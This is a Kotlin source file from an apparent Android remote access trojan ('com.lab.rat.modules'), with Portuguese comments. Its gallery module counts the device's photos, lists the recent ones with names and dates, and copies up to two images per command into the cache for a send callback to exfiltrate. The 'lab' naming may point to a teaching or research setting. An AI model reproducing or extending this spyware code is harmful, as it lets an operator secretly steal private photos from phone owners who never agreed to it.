package com.lab.rat.modules

import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object GalleryModule {
    private val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    fun count(ctx: Context): String {
        var n = 0
        ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media._ID), null, null, null)?.use { n = it.count }
        return "Total de imagens: $n"
    }

    fun list(ctx: Context): String {
        val sb = StringBuilder()
        var n = 0
        ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED),
            null, null, "date_added DESC")?.use { c ->
            while (c.moveToNext() && n < 30) {
                sb.append("${c.getLong(0)} - ${c.getString(1)} - " +
                        fmt.format(Date(c.getLong(2) * 1000)) + "\n")
                n++
            }
        }
        // bug #9: header só é adicionado se houver resultados
        if (n == 0) return "Nenhuma imagem"
        return "Últimas $n imagens:\n$sb"
    }

    suspend fun dump(ctx: Context, n: Int, send: suspend (File) -> Boolean) {
        val max = n.coerceIn(1, 2) // rate-limit: máx. 2 por comando
        val ids = mutableListOf<Long>()
        ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media._ID),
            null, null, "date_added DESC")?.use { c ->
            while (c.moveToNext() && ids.size < max) ids.add(c.getLong(0))
        }
        for (id in ids) {
            copyToCache(ctx, id)?.let { send(it) }
        }
    }

    fun get(ctx: Context, id: Long): File? = copyToCache(ctx, id)

    private fun copyToCache(ctx: Context, id: Long): File? {
        val uri = Uri.withAppendedPath(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
        val f = File(ctx.cacheDir, "img_$id.jpg")
        return runCatching {
            // streaming: nunca carrega o arquivo inteiro em memória
            ctx.contentResolver.openInputStream(uri)?.use { input ->
                FileOutputStream(f).use { input.copyTo(it) }
            } ?: return null
            f
        }.getOrNull()
    }
}
